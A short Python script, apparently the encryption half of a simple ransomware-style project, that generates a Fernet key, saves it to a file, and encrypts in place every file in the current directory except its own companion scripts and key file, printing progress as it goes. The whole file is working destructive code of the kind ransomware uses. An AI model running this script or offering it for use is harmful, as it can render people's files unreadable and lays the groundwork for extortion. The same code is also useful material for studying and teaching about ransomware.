#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

#Files to be encrypted...
files = []
for file in os.listdir():
    if ((file != "encrypt.py")and(file != "theKey.key")and(file != "decrypt.py")and(file != "main.py")):
        if os.path.isfile(file):
            files.append(file)

#Stats of files to be encrypted...
num_of_files = len(files)
status_func = (1/num_of_files)*100
status = 0.0

#Generating the encryption Key...
key = Fernet.generate_key()
with open("theKey.key", "wb") as the_key:
    the_key.write(key)

#Encrpyption...
for file in files:
    with open(file, "rb") as theFile:
        content = theFile.read()
        encrypted_content = Fernet(key).encrypt(content)
        with open(file, "wb") as theFile:
            theFile.write(encrypted_content)
            status+=status_func
            status = round(status, 1)
            if status <= 100:
                print(str(status)+ "% " + "done..")
            else:
                print("100% " + "done..")


print("Files at the location " + os.getcwd() + " are encrypted..!")